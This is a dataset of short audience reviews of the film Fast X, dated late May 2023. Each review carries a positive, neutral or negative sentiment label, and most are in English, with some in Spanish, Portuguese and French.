"May 30, 2023",NEUTRAL,"It's slightly more realistic than the previous one... But what did I say? forget all fundamentals about physics, gravity, fragility of the human body, and resistance of cars. It's not bad, if you forget that it is originally a car racing movie with a parallel story to explore the lives of the characters and their daily situations.

It can be enjoyed, it can amuse you, but it is implausible, it is."
"May 30, 2023",NEUTRAL,"Menos grandioso que os anteriores, a franquia já começa a mostrar sinais de desgaste, tendo que usar de vários artificios para tentar surpreender o público. As cenas de ação ainda são feitas na maioria das vezes com efeitos praticos o que continua causando algumas sequencias bem emplogantes mas mesmo assim, tem que usar a suspensão da descrença para aceitar várias coisas que acontecem durante a exibição."
"May 30, 2023",POSITIVE,Good movie. Ending annoyed me. About on par for the newer fast movies.
"May 30, 2023",NEUTRAL,"The movie was exciting in the beginning and then it got stale in the middle. By the time the son was kidnapped, it ended abruptly and we found out there are 2 more movies for this franchise. It needs to be action all the time and less character build up because it has too many characters"
"May 30, 2023",POSITIVE,Its just fun! Just plain fun. Nothing else to it. Nothing else needed. Fun!
"May 30, 2023",POSITIVE,Fantastic movie experience
"May 30, 2023",NEUTRAL,"I didn't like it, I think the first movies  it was better"
"May 30, 2023",POSITIVE,Movie was fire!!! Great message on family over everything!!
"May 30, 2023",NEUTRAL,Just stop. I was a HUGE fan back when they first stared off. I have tried to continue to be a fan but its just not worth it anymore. Lets leave Fast & Furious with great thoughts and not keep butchering it. Personally I will no longer watch anymore. I have purchased the good ones and the last 2 are just not worth it. Next bright idea please
"May 30, 2023",POSITIVE,Movie is pretty good and the new addition of this villain is probably the best. Excited for the next parts. Looks like there’s gonna be a part 2 and 3
"May 30, 2023",NEGATIVE,"""Fast X: A Convoluted Ride Hindered by Overcrowded Characterization and Missed Emotional Opportunities""

Rating: 2/5 stars

""Fast X"" speeds onto the screen with a whirlwind of high-octane action, but its convoluted storytelling and crowded character development detract from the overall experience. While the film showcases standout performances by Jason Momoa and John Cena, it fails to strike a balance between character moments and a cohesive narrative, leaving emotional depth in its wake.

One of the film's major shortcomings lies in its convoluted plot, weighed down by an excessive number of side stories. It often feels as though the movie is more interested in introducing and applauding each character than weaving them into a satisfying and coherent narrative. The result is an elongated TV episode that struggles to tell a proper story, leaving viewers longing for a more focused and engaging experience.

Amidst the chaos, Jason Momoa's performance as the villain shines as a delightful and gleeful standout. His portrayal injects much-needed energy into the film, but it can't fully compensate for the uninteresting treatment of previous villains and the downplayed emotional moments from earlier installments. The film's attempt to uplift Momoa's character at the expense of these crucial elements diminishes the impact of what came before, leaving fans yearning for a more balanced and respectful continuation of the franchise's established emotional resonance.

Furthermore, the overcrowding of character moments leaves little room for the ensemble cast to breathe. While John Cena's character and sub-plot are highlighted as another positive aspect of the film, the predictability leading up to these moments undermines their impact. The film's eagerness to give each character a moment of their own sacrifices the opportunity for genuine character development, leaving some feeling underutilized and the overall narrative feeling disjointed.

Despite its flaws, ""Fast X"" still delivers exhilarating action sequences and impressive visual effects. The adrenaline-fueled spectacle and the charismatic presence of the cast provide moments of excitement and entertainment. However, these highlights are overshadowed by the film's failure to strike a cohesive balance between its characters, storylines, and emotional resonance.

In conclusion, ""Fast X"" struggles to find its footing amidst its convoluted storytelling and overcrowded character moments. While standout performances by Jason Momoa and John Cena add sparks of brilliance, the film falls short in honoring the emotional depth of previous installments and fails to give its ensemble cast the breathing room they deserve. Die-hard fans may find elements to enjoy, but for those seeking a well-crafted and emotionally resonant experience, ""Fast X"" fails to live up to its predecessors."
"May 30, 2023",POSITIVE,I loved it. It was great. Brought back a lot if old characters. Jason Momoa was also funny
"May 30, 2023",POSITIVE,Myself and my son found the movie very entertaining! Was bummed the way it ended but I get it and will see the next!
"May 30, 2023",NEGATIVE,I don't even have the energy to explain why this movie was the worst movie I've ever seen and I grew up on this franchise. Loved almost all of them but this was awful. Not going to see the next two.
"May 30, 2023",POSITIVE,was good but two parts are a bit annoying
"May 30, 2023",POSITIVE,Like all from beginning to end . Can’t wait for the other 3 parts coming up
"May 30, 2023",POSITIVE,Vin Diesel and Jason Momoa do not disappoint in this movie!
"May 30, 2023",NEGATIVE,"Way too much it never stops. You could say it’s entertaining but it’s so long, far fetched, and convoluted, it becomes boarder line insulting. Doesn’t even leave you with the cliff hanger it leaves you with an answered nothingness."
"May 30, 2023",NEGATIVE,Money grab.  Just let the series go.
"May 30, 2023",NEGATIVE,So bad. Jason Mamoa’s character and acting was the only thing good about this corny and predictable film. Waste of time and money.
"May 30, 2023",POSITIVE,"more car scenes, typical ridiculous stunts that we've come to love from Fast movies. excellent cast and non stop surprises. great movie all around"
"May 30, 2023",NEUTRAL,"I’m excited for the next one just as anyone else, but can they stop killing off characters then miraculously resurrect them."
"May 30, 2023",NEUTRAL,"Good flick.  Lots of crazy unrealistic stunts.  It was exactly what we expected, but with more open of an ending than we would have liked if this is to be the last of the main crews movies."
"May 30, 2023",POSITIVE,I loved the story line and was great to see everyone and the newbies on the show .
"May 29, 2023",POSITIVE,They said this was going to be the last one but it isn't
"May 29, 2023",POSITIVE,"Really enjoyed it, so happy to see so many faces..just mad it ended 😠😔"
"May 29, 2023",NEGATIVE,"The storyline and use of ""physics"" is extremely far fetched. Fast X makes your typical superhero film look like a documentary. I found myself holding my head in disbelief for 90% of the film."
"May 29, 2023",NEUTRAL,Special effects and fight scenes are good but story line is questionable.
"May 29, 2023",POSITIVE,Wild fun ride ! ALL HEROS DON’T FLY THEY DRIVE CARS !!
"May 29, 2023",POSITIVE,It was great. It was a nice action movie with fights and car chases. Would recommend.
"May 29, 2023",POSITIVE,Action pack. The movie delivered 2+ hours of excitement.  Jason Mamoa was an awesome villain.
"May 29, 2023",POSITIVE,The movie was very action packed. Many surprises. Never a dull moment. Like it a lot.
"May 29, 2023",NEUTRAL,I’m sorry I just think sometimes I don’t care how many billions it may be time to let this whole franchise retire. Jason Momoa I just couldn’t take seriously as a villain and the movie ending basically made me feel anger.
"May 29, 2023",POSITIVE,Lots of action and twist to the movie. You must stay until the lights in theater comes on.
"May 29, 2023",POSITIVE,I liked the creative action. Passionate moments were lacking emotions and feelings.
"May 29, 2023",POSITIVE,It was what was expected.  Lots of action and top actors.
"May 29, 2023",POSITIVE,Better than Fast 9! Great movie! Fun movie!
"May 29, 2023",NEUTRAL,"🏎🚘The Fast and Furious series has always had a lot of suspension of disbelief, but it has gotten to the point where it's ridiculous in my humble opinion.  The movies are still entertaining & fun, but just a bit too unbelievable for my taste. 😜🤣"
"May 29, 2023",POSITIVE,What a wild ride!!! Talk about getting the old crew back together!
"May 29, 2023",POSITIVE,"The best movie of the saga.
From begging to end. It gave me goosebumps."
"May 29, 2023",NEGATIVE,Not like the first ones with the cars in it.
"May 29, 2023",POSITIVE,"As a fan of the franchise since I was a kid, this is by far one of the best ones Ive seen in a while!"
"May 29, 2023",POSITIVE,Badass movie!! Great actors and visuals throughout
"May 29, 2023",POSITIVE,Super awesome action scenes. I loved all the surprises and beautiful storyline.
"May 29, 2023",POSITIVE,"Good action movie, but didn't really see the end coming this way"
"May 29, 2023",POSITIVE,Good story line and lots of action! CGI was pretty good!
"May 29, 2023",POSITIVE,"Fast X is good. Jason Momoa is a great villain and I really enjoyed his character. It's a silly, cheesy, fun movie that doesn't take itself too seriously."
"May 29, 2023",POSITIVE,This is a Fast movie. What did you expect? All hail Jason Momoa.
"May 29, 2023",POSITIVE,So good!... Jason Momoa slayed it!...
"May 29, 2023",POSITIVE,The Fast Family NEVER disappoints! I've seen all 10 movies.
"May 29, 2023",POSITIVE,Like the all action is non stop action and the drama story behind it. Can't wait for the next episode.
"May 29, 2023",POSITIVE,"Insane, ridiculous, wild, yet fun. The stunts and action scenes were quite literally flabbergasting. Every time I see a new Fast and Furious movie, I never think they can outdo the last movie with the stunts, yet, they always somehow do.

My only problem was that there was so much action, it got a bit boring at some points. Though, I still remained entertained. Jason Momoa's character was especially hilarious and cruel at the same time. Can't wait for the next one!"
"May 29, 2023",POSITIVE,How long must we wait for the next one?!?! 🤯
"May 29, 2023",NEGATIVE,"La verdad es que vi la peli muy exagerada salida de tono no me gustó, además de que lo hacen ver como un señor todo poderoso a Toretto ya basta Universal es un chiste la peli"
"May 29, 2023",NEGATIVE,"It was just as I thought... not believable too over the top...all characters are basically immortal and not superhuman...it killed time for me...had good graphics, but like most movies that have too much repetition, this one should have died long ago... or family should have died. Sorry not sorry, it ust didn't hit the mark."
"May 29, 2023",NEGATIVE,"Cada escena fue un ¿Qué está pasando?! ¿Cómo es posible este suceso?!! Jajaja Tantos momentos que ni en mis mejores sueños me sucedería.

Pero pese a todo, cumple con su objetivo, es decir, es una película de acción, con autos, y explosiones, muchas explosiones. ¿Qué más esperas de una película de este tipo? ¿Una gran historia? Claro que no! Uno va al cine para ver peleas, carreras y explosiones.

Jason Momoa hace un gran trabajo como el villano, claro no es ni será un villano memorable, pero cumple con las escenas de acción. Hay mucho que criticar, muchos comentarios negativos, pero para que, esta película no va para el oscar, va para conseguir billetes, y con ese objetivo se mete al público en el bolsillo.

Si no quieres pensar, y solo quieres reír y explosiones muy locas, mira Fast X, cumple con lo que promete. No lo pienses mucho, es lo que es, ni más ni menos. Solo una película de acción, autos y explosiones. Y que viva la familia.

Como última recomendación, no le busques la lógica, no la encontrarás, solo disfrútala, y ten fe."
"May 29, 2023",POSITIVE,As usual the 5 does not disappoint. I want to see it again and again. I love the action and the storyline.
"May 29, 2023",NEGATIVE,The movie was more special effects than story. I think they have run out of ideas for this series.
"May 29, 2023",POSITIVE,Thrilling setup to the finale of the fast saga
"May 29, 2023",NEUTRAL,Knowing That I've been a huge Fast and furious fan since I was 12 and then 13 I really did quite enjoy this movie but one fact that I don't get is why assume it's the last movie when the villain ain't never die but the last period (Jakob's death) really did crush me knowing that he is obviously one of my favorite characters because of John cena one of my favorite wrestling stars since I was little but anyway this movie deserves probably a 80%. Good job ya especially on all the actions and cars.
"May 29, 2023",POSITIVE,it tied into fast five
"May 29, 2023",NEGATIVE,Kraft CHEEEEEESE and macaroni
"May 29, 2023",POSITIVE,I loved the movie and I can't wait for the next one.
"May 29, 2023",POSITIVE,This is by far the best movie in the franchise.
"May 29, 2023",POSITIVE,"Great cast and action scenes. 
Funny at times and emotional 
Great movie"
"May 29, 2023",POSITIVE,"I loved the movie. However, I hated the ending. Showing the Dominic crew being blown up in the plane and then the bomb with his son. No real ending in sight, which leads me to believe that there has to be another movie because there’s just too many loose ends."
"May 29, 2023",NEGATIVE,Heard Dominic Toretto fights Son Goku in the next part and wins. It simply has nothing in common with the original movie.
"May 29, 2023",NEGATIVE,Le han perdido el respeto a las peladas. 
"May 29, 2023",POSITIVE,Loved it!! Can't wait for the continuation!!!
"May 29, 2023",NEGATIVE,"Only reason I watched this movie as bin Disel said this is the last movie , then they went to make part 2 now. Seriously after almost 15 years this how you played with fans. Defiantly not worth it."
"May 29, 2023",POSITIVE,"Good seating, cleanliness of the theatre. Just too long with movie intro prior the beginning of the film. The next movie will need to be the last one please!"
"May 29, 2023",POSITIVE,"The movie was awesome , with a lot of action, ending was not si 
so okay"
"May 29, 2023",POSITIVE,"Great movie, packed with action and nostalgia"
"May 29, 2023",NEUTRAL,Jason Momoa saved it
"May 29, 2023",NEGATIVE,Not a fan for shows that have to be continued. Especially when the continuation is not happening immediately.
"May 29, 2023",NEGATIVE,Too dumb to make me suspend my disbelief.  Good music though.
"May 29, 2023",POSITIVE,It was worth the wait and waiting for now # 11! Thankful for others on blue ray until next one !
"May 29, 2023",POSITIVE,Awesome action packed.
"May 29, 2023",POSITIVE,Lots of action that was believable. Love the storyline and actors
"May 29, 2023",POSITIVE,Action packed and fast paced! Extremely entertaining movie that must be seen on the big screen!
"May 29, 2023",POSITIVE,Awesome. Lots of actions. Look forward to seeing the next Fast hopefully next year
"May 29, 2023",POSITIVE,"This franchise never disappoints. Amazing cast & always full of surprises. Can't wait for the final installment, but I'll be dad to see it end."
"May 29, 2023",NEGATIVE,The movie was decent.  The movie theater was too hot.  The air conditioner was not working in the lobby and the theater was very muggy also.  The popcorn had a funny taste also
"May 29, 2023",NEGATIVE,"It wasn't as good as the last one, and I was disappointed in that one. I've really enjoyed most of the series, but they lost me kart time sending a Fiero to space. This time I couldn't get past the over acted performance of the villain. It bumped me every time he was on the screen. Preposterous even by Fast standards, and that's saying something."
"May 29, 2023",POSITIVE,"Love it was Amazing, Emotional and Surprisingly Awesome just hope they continue the Franchise after they'd left off with a Cliff-Hanger"
"May 29, 2023",POSITIVE,this was by far the best Fast movie in a long time
"May 29, 2023",POSITIVE,"Awesome plot, action, drama, and suspense.  Always a new challenge not expected.  Best fast movie of all time."
"May 29, 2023",POSITIVE,The ending was funny lol wasn’t expecting them to do that lol
"May 29, 2023",NEGATIVE,"Pésima película, ya tienen idea de que inventar solo por tener dinero y querer exprimir una franquicia que perdió su sentido desde hace varias entregas."
"May 29, 2023",POSITIVE,Kept us on our toes.  So much behind the scenes stuff and how the one guy is always a step ahead.
"May 29, 2023",NEGATIVE,Worse ending ever!  The only 2 Survivors were cypher and Lexie?  Really!!!! I wished I stayed home and saved my monry
"May 29, 2023",NEGATIVE,"2nd least favorite of all FF movies (Tokyo Drift was the 1st). Main characters played minor roles. Too much about the new villian, and why does he have to be so flamboyant? When Jason Statham and Dwayne Johnson were introduced to the franchise they were evil and kickass characters. Jason is introduced and he dances and prances around talking about his paint nails, really?"
"May 29, 2023",POSITIVE,"It was my type of movie, so I give it a 95! What is it with the critics giving 54%. Do they want to appear as ""great"" critics by simply giving a low score?!!"
"May 29, 2023",POSITIVE,Excellent special effects!!
"May 29, 2023",POSITIVE,enjoyed it so much - jon cena was super fun in this movie. not loving how long we will have to wait for the next one
"May 29, 2023",POSITIVE,Non stop excitement ‼️
"May 29, 2023",POSITIVE,Good movie. This was the best one yet.
"May 29, 2023",NEUTRAL,"Buena película, pero pésimo final. Más exactamente, no tiene uno."
"May 29, 2023",POSITIVE,It’s good but why did John cena die did the others die on the ✈️ plane  and did som and his son die when they got off the bridge let’s hope the next one is because this is Fast x
"May 29, 2023",NEUTRAL,"Muito do mesmo, nada inovador"
"May 29, 2023",POSITIVE,A well told action movie that keeps your attention beginning to end.
"May 29, 2023",POSITIVE,Buena la película muy buena
"May 29, 2023",NEUTRAL,"Fast X Movie Review – gasoline powered soap opera struggles to find the exit 
(Spoiler Free)

Fast X (still should have been called Fast-10 Your seatbelts) is the latest installment in the Fast & Furious Franchise and it is a car wreck.

Fast X rides down the tarmac; engines howling and tires squealing, offering a transfixing spectacle, but it does not tell us why we should care about the driver or his crew. The franchise that famously doubles down on Family refuses to provide screentime to flesh out their characters, inevitably splintering the viewer's emotional attachment to Dom's crew.

Enter Dante Reyes, son of the baddie from Fast Five (2011), manic over revenge for his slain father and the theft of his ill-gotten fortune. Over the course of many brain-numbing action set-pieces Dante tries to scratch his proverbial itch 	with his manicured lavender-shaded fingernails. 

Topping the action set-pieces of the F&F predecessor flicks is a tough act and FAST X proves it. On one occasion, Dom uses his buffed-out Charger and a swiveling crane to pinball a trundling spherical time-bomb away from the Italian landscape and into a river. Such grotesque and needlessly complicated feats of live-action anime dull one's senses as realization sets in that there is no emotional weight to up the ante. Fear not viewer; death is but a pit-stop in these flicks, pending contractual negotiations.

Weirdly enough, for a franchise centered around vehicular mayhem, Fast X parades around too many hand-to-hand combat sequences to one's liking. 
The movie splits up the gang who then proceed to go on separate quests; thereby rupturing its narrative flow. For example: as Letty and Cipher are about to finish up their story arc, Fast X opts to teleport over to someone else; after a short while this shtick gets old and annoying, courtesy the quarter mile long cast list.

Fast X cramps in more folks than a minivan on a pilgrimage, with the likes of Vin Diesel; back with his signature mumble-growl, Michelle Rodriguez, Ludacris, Tyrese Gibson, Charlize Theron, Jason Statham, and many more glorified cameos. John Cena, as Toretto's long lost brother Jakob, stands out in particular; thanks to his natural charisma and comedic timing. 

For all its faults, Fast X pleases all: a fleeting glimpse of a loud roadside hoarding that manages to make you snort at its comic absurdity before it recedes in your rearview mirror in a popcorn scented afterimage."
"May 29, 2023",NEUTRAL,"Loads of action and witty quips with attempts of family lessons. But stunts and CGI are so past the point of impressing, plus with an added feature of resurrecting long thought dead characters. 
Its not Gone with the Wind, but we all know that, go see the film for what it is and what weve come to expect."
"May 29, 2023",NEUTRAL,"honestly I think the movie was good, but some scenes were kinda off but overall good movie."
"May 29, 2023",POSITIVE,Action packed from the very beginning.  I loved how they are incorporating all old characters.
"May 29, 2023",POSITIVE,Action from beginning to end! Jason Mamoa made an excellent villain!
"May 29, 2023",POSITIVE,It's a fun popcorn movie. The more far fetched the funnier it is. Don't take it seriously.
"May 29, 2023",NEUTRAL,"Well, it reminded me of a mini series,  they just add different characters to fill the time. Gota say though it was a Allstar cast. 
But didn't really go anywhere.  Of course,  plenty of action. I paid 10 bucks matinee price and was entertained. All I really can expect."
"May 29, 2023",NEGATIVE,Corny as hell SMH unrealistic things going on like Vin lifting a car with 1 hand! And the ending?  Ooohhh let's talk about it...I HATE sitting thru a movie.. especially 1 I paid 2 see..& the ending SUCKS!!!
"May 29, 2023",POSITIVE,Did not disappoint! Jason Mamoa is a great addition to the cast of characters!
"May 29, 2023",POSITIVE,Awesome. Can’t wait for the second one.
"May 29, 2023",POSITIVE,Great movie full of fast cars action and lots of off your seats scene.
"May 29, 2023",POSITIVE,"I don't know what say about Fast X. But this film was very fun to watch. Best cast and villain.
I didn't know the Rock was going to be in the film because I heard the rock and Vin diesel aren't friends any more. That is wow to see the rock still in the film."
"May 29, 2023",POSITIVE,There is alot of family in this movie
"May 29, 2023",POSITIVE,"Over the TOP! The most action packed so far of all the series. Leaves you wanting to see the next installment to see who/how they survived. Can't wait to see Dwyane Johnson and how he fits in the next storyline. Loved seeing all the previous ""players"" of past featured in this one."
"May 29, 2023",NEGATIVE,"This franchise has consistently become more and more unrealistic and neglects all reality of death. Just go see if you like cars and actors that a sometimes funny. Jason Mamoa being a flamboyant super villian was a treat, really made the movie bearable."
"May 29, 2023",NEGATIVE,The franchise has always been kinda far fetched but atleast it had a good story line. The only good part was Jason's comedic relief.
"May 29, 2023",POSITIVE,"Being a Fast fan I have to say I was very sceptical about where this franchise was going. I was super disputed in Fast 8 but Fast 9 was decent. Fast X was greatly better. Jason Momoa's character honestly is what made this movie better in addition to John Cena. Jason's character takes the franchise into a different vibe and it works. The one thing I wish they would do or should have done is to kill off Paul's character. I loved Paul Walker, but continuing to dance around his character, especially considering the character that he was, is ridiculous. Bryan would not miss out on these major events and it's silly to keep dancing around the idea of his character still being around."
"May 29, 2023",POSITIVE,Not bad... it's not dissapointing but I am not impressed either. At least it has good action ;)
"May 29, 2023",POSITIVE,One of the best in the franchise so far. Loved the action sequences. Jason Mamoa perfect performance introduced us to the greatest villain since fast and furious ever started. Can wait to see more
"May 29, 2023",NEGATIVE,"Caught it opening day. I'm a fan of the series, but this one fell ridiculously short. Yes we expect spectacular FX, but THIS one just didn't cut it. Essentially an FX film with some intercuts of human presence. If there is a shining star in any of this, it's Jason's seriocomical performance. The question now is...see the 2nd installment? Or not? The jury's out."
"May 29, 2023",NEGATIVE,I thought this movie was the most stupid movie I have seen in years.
"May 29, 2023",NEGATIVE,I NOT HAVE A TIME TO WATCH THE MOVIE I CALL CUSTOMER SERVICE AND ASK FOR THE REFOUND A IS SAIS NO
"May 29, 2023",NEGATIVE,"Jason's character was humorous, that's it. I walked out."
"May 29, 2023",NEGATIVE,"En tant que fan du saga, celui l cest trs moyen."
"May 29, 2023",POSITIVE,Great continuation of the story.
"May 29, 2023",POSITIVE,"It was awesome, jam packed with action! Momoa did a great job in his villain role, and it was great to see everyone! Would see it again! Excited for next one!!!"
"May 29, 2023",NEUTRAL,"I'm not a fan of the franchise, but the trailers were more interesting than previous. This was entertaining and easy to follow with all the exposition. 

It's a big blockbuster with a loyal fanbase that should love it. Like Infinity War it has an unfulfilling ending that grates where Infinity War didn't - this franchise hasn't earned it. 

If the next movie builds as well on this one, I'd likely give the movies 1-2 stars extra as a pair, because it was entertaining and doesn't take itself seriously at all."
"May 29, 2023",POSITIVE,It was a great movie but I didnt expect to be left hangin.
"May 29, 2023",POSITIVE,"This was awesome, a lil bit of everyone, and you know.....There will most definitely be another one!"
"May 29, 2023",NEGATIVE,Other garbage🤦🏾‍♂️🤦🏾‍♂️🤦🏾‍♂️🤦🏾‍♂️
"May 29, 2023",POSITIVE,A bit like avatar starts slow but speeds up and develops into a whole new franchise like James Bond with a nemesis after them all and many more films to come I suspect
"May 29, 2023",POSITIVE,Loved everything about it can not wait for the next one.
"May 29, 2023",NEUTRAL,It was good Jason was great good storyline
"May 29, 2023",NEUTRAL,But I don’t like the way the movie finish
"May 29, 2023",POSITIVE,It was great movie anyone who says it sucks especially the people that run rotten tomatoes is stupid
"May 29, 2023",NEGATIVE,Terrible ending like what bruh
"May 29, 2023",NEGATIVE,"The storyline in the beginning was good with some surprises and betrayals but further on the storyline kinda fell through,it wasn't good enough for me to watch a second time"
"May 29, 2023",POSITIVE,"Fun, full of action and silly."
"May 29, 2023",POSITIVE,This movie was everything from funny to emotional. Great tribute to Paul and great introduction to Dante
"May 29, 2023",POSITIVE,the turbo was placed on the wrong side of the porsche rb 26 it should’ve been on the driver side front wheel
"May 29, 2023",NEGATIVE,Now I know why I didn’t watch the other 9 in the series. We left before it was over.
"May 29, 2023",POSITIVE,"Excellent from start to finish. Fast paced, and the story fits. Can't wait for the next one."
"May 29, 2023",NEUTRAL,Not bad? But the story line is played out! The next 1 has to b the END
"May 29, 2023",POSITIVE,Way better than I thought just goes to show you think for yourself don’t let other peoples opinions sway you because this movie was a blast
"May 29, 2023",POSITIVE,The movie was amazing especially the action parts.
"May 29, 2023",POSITIVE,"Damn that cliffhanger man! Also I saw Debby Ryan and her husband?! There is some good funny bits that cuts the tension just a little, not too much. I enjoyed it, especially with other watching with me :)"
"May 29, 2023",POSITIVE,SO GOOD! Probably my favorite Fast and Furious movie so far! Intense action sequences and an amazing cliffhanger! I’m so excited for the next movie!!!
"May 29, 2023",POSITIVE,None stop acting. A lot of surprises. 🔥🔥
"May 29, 2023",NEGATIVE,I liked Jason I thought he was funny entertaining
"May 29, 2023",POSITIVE,Loved the movie!!! Just wish the next would come out sooner than 2025😩😩.  The cast selection was fantastic!  We are such fans🥰🥰.
"May 29, 2023",POSITIVE,Great film. Lots of action and comedy and suspense. Will see it again!!
"May 29, 2023",POSITIVE,"Liked the characters and action sequences, and the thought Pete Davidson's character was lame and confusing why he was there."
"May 29, 2023",POSITIVE,"Great movie, theatre okay."
"May 29, 2023",NEUTRAL,Didnt write Brian out.  Story line jumps all over the place
"May 29, 2023",POSITIVE,Action packed all the way thru. We loved it and are watching it again tonight
"May 29, 2023",NEUTRAL,Non-stop over-the-top stunts/action.
"May 29, 2023",NEGATIVE,"The movie was good, however, the employees at the theater at the concession stand were very slow."
"May 29, 2023",NEGATIVE,"Nothing new in this movie, its the same all over again. Jason Momoa is the highlight in the movie he is great as the villian.They should have stop after Furious 7"
"May 29, 2023",POSITIVE,"Action packed from start to finish! The stunts and special effects were off the chain. Awesome casting, LOVED IT! Best one yet!"
"May 29, 2023",NEGATIVE,The  director needs to realize ppl are there mainly for the cars and Og cast. Hate to say this but probably my last one. All those actors and the movie stunk. All the money they have and can’t have some solid cars with a dope story line. I genuinely believe I can do better
"May 29, 2023",POSITIVE,100% would watch again and again
"May 29, 2023",POSITIVE,I cant wait for the next one
"May 29, 2023",NEGATIVE,Not realistic this is why people drive the way the do !!!!! And teaching children how to do donuts in their vehicle is a no no no !!!!!!
"May 29, 2023",POSITIVE,"loved Momoa's act .... 
the car chase  very good !!
The actors that participated was a good adding 
Statman's fight ... and the end  phrase on the scene 
The antarctic fight ... 

Well the special effects and the stunts are exceptional

last .. the golden Lambo ... wtf... !! 😀 brilliant add on.

This is a good action movie, congrats 👏"
"May 29, 2023",NEGATIVE,Quit  bringing people back from the dead in the movies
"May 29, 2023",NEUTRAL,"Behind every ""running on fumes"" and ""bumpy road"" pun is a film fan just cynical and morbidly curious enough to see this nutty franchise out, I swear to God. While there are sadly no dinosaurs or sharks to be jumped in this installment, ""Fast X"" thankfully delivers on absurdity in the form of Jason Momoa's turn as possibly the saga's most bombastic retcon to date. This guy's in a totally different movie. Imagine if Castor Troy and Simon Phoenix's lovechild had a ""gang weed""/""society"" phase. Like, the character is so cringeworthy that it sort of horseshoes its way around to being the most entertaining part of the film and, yes, I do mean that as a compliment. You're also given a bevy of those ""of course they brought that character back"" moments, all of which only add on to the franchise's ironically unironic trademark of shameless self-perpetuation. I'd be lying if I didn't say I was continually impressed by the audacity. Look, these aren't great movies anymore. They haven't been great since ""7"" and I know that. I'm simply here so that I can say I was here. I witnessed and contributed to it all. Soon, we'll see on what side of history I end up on, I guess."
"May 29, 2023",POSITIVE,I loved it.. it was giving
"May 29, 2023",NEUTRAL,"Good fast and furious movie. Everything you can expect, good action and fights. Jason Momoa does an amazing role. Good movie!"
"May 29, 2023",NEGATIVE,"Silly, boring, not a good story."
"May 29, 2023",POSITIVE,Outstanding and edge of seat roller coaster
"May 29, 2023",POSITIVE,Action packed from start to finish!!!
"May 29, 2023",POSITIVE,"Excellent, Can't wait for the next movie!"
"May 29, 2023",POSITIVE,Loved it. Action pack from beginning to end.
"May 29, 2023",POSITIVE,"Great movie
Action packed from start to finish"
"May 29, 2023",POSITIVE,Excited and very good work doing special effects
"May 29, 2023",POSITIVE,"What a RUSH ! 

But I really hate cliffhangers"
"May 29, 2023",POSITIVE,"Hilarious, action packed, Jason is the perfect villain"
"May 29, 2023",POSITIVE,"Definitely has me thinking after the movie. But, it was good. I still miss Paul."
"May 29, 2023",POSITIVE,"Una película que para los amantes de la acción les encantara, un villano que pega donde mas le duele al protagonista, secuencias muy buenas que te mantendrán entretenido durante toda la película, espero que para la siguiente película las explicaciones que den para los personajes que regresaron no sea absurda o por lo menos que lo fantasioso no lo lleven a otro nivel, aunque con esta saga ya no se sabe que esperar."
"May 29, 2023",POSITIVE,Fast 10 doesn’t leave anything out combines the story all the  movies. Action packed scenery amazing. Acting absolutely amazing and leave you another one.
"May 29, 2023",POSITIVE,"What a fun time at the movies.  Jason Momoa is the Joker to Vin Diesel's batman.  So much cool action in Rome and Brazil and Portugal, from death ball bombs to using a car to spin exploding helicopters around into things.  The team is scattered through most of the movie and it ends on a cliffhanger, but can't wait for the next one to bring everything together for the last ride."
"May 29, 2023",POSITIVE,"This one connects a lot to the past, but brings in a new storyline. All the usual characters were there, with a few you wouldnt expect. Looking forward to 11"
"May 29, 2023",POSITIVE,I loved the whole movie.  Just made it is 2 parts.
"May 29, 2023",POSITIVE,I thought it was an awesome movie. it kept us out of our seats with all the actions. we wish Paul Walker was still alive to be part of it.
"May 29, 2023",NEUTRAL,Harry Potter is more realistic. But it’s a fun 2 hours!
"May 29, 2023",POSITIVE,Would have recieved 5 stars except for the ending.
"May 29, 2023",NEUTRAL,"Gostei que teve bastante ação isso é a cara X Fast mais me deixou a desejar a construção dos personagens novos achei que eles ficaram só pra preencher a tela o que me deixa muito desagradada, o roteiro achei bem fraco aquele final me deixou insatisfeita final fraquíssimo . agora amei a interação do pequeno Brian e Jakob isso me chamou bastante atenção o jeito que ele trata o garoto é lindo digno de um tio amoroso.."
"May 29, 2023",POSITIVE,Great action movie. Jason Momoa was a great addition  to the saga. While it was a cliffhanger we are looking forward to the next installment
"May 29, 2023",NEGATIVE,"Comical and didn't mean to be.  Writing was terrible.  Effects over ""blown"" (pun intended).  Too much loses the intended effect..."
"May 29, 2023",POSITIVE,The movie had action all the way thru.  One of the best out of the series
"May 29, 2023",POSITIVE,The most absolute best action movie of the year. 🤍🙌🏻
"May 29, 2023",POSITIVE,"Momoa’s performance, which is one of the best love-to-hate-them villain performances in years. It’s a sight to behold and the reason to see the film."
"May 29, 2023",POSITIVE,"i hated the ending, i dont like cliffhangers"
"May 29, 2023",POSITIVE,"Family

Salute mi familia"
"May 29, 2023",POSITIVE,Excellent movie...great cast!
"May 29, 2023",POSITIVE,Just left us with a cliffhanger.
"May 29, 2023",NEGATIVE,"Absolutely horrible addition to the Fast & Furious legacy.  The movie was a mess and went all over the place in so many different directions. It also leaves you hanging at the end so you will come back for another one to see what happens.  The acting was good, as always, but the storyline is horrible.  I wish they would of never mentioned Brians name, like he is here and not gone and I wish they would of made a similar movie like the F&F movies up until Paul Walker passed away.   I wanted to walk out after the first 30 minutes, but I was with others. I definitely will not return for another."
"May 29, 2023",POSITIVE,"It was another again awesome action packed, far-fetched adventure. Its too bad though that so many people left at the end of the movie thinking it was over a Credit starting to play and within a few more minutes another scene return to the movie. A lot of people will not know about this unless they hear from others. It leaves it open for another fast and furious tend to come in the future so many things hanging about what will come next great movie great job.  Ride on!"
"May 29, 2023",POSITIVE,"It's an action movie with very little real racing. I found the story too forced and the resurgence of characters mysterious again. Still, it's a good movie."
"May 29, 2023",POSITIVE,I really enjoyed the movie. action packed!
"May 29, 2023",POSITIVE,We loved the action packed from beginning to end!
"May 29, 2023",POSITIVE,"I loved the movie but I didn't really like the ending, I have to wait two more years to see the reunion between Guísele and Han."
"May 29, 2023",POSITIVE,"Great movie, good plot and lots of action,"
"May 29, 2023",POSITIVE,loved it and highly recommend 👌
"May 29, 2023",NEGATIVE,Worst experience kids crying moms yelling
"May 29, 2023",POSITIVE,truly enjoyed every minute
"May 29, 2023",POSITIVE,Did not like the ending but it was great
"May 29, 2023",NEGATIVE,Didn’t go want a refund stuck in traffic
"May 29, 2023",NEGATIVE,Too much fighting and action packed. very confusing groups in the beginning too.
"May 29, 2023",NEGATIVE,"Too many stories running alongside the main plot story. Antagonist is not believable. The least about cars the Fast and Furious series ever has been. Almost every call back possible (which was a lot). 96% Action, 4% story and random drama. Lastly defying physics a lot.
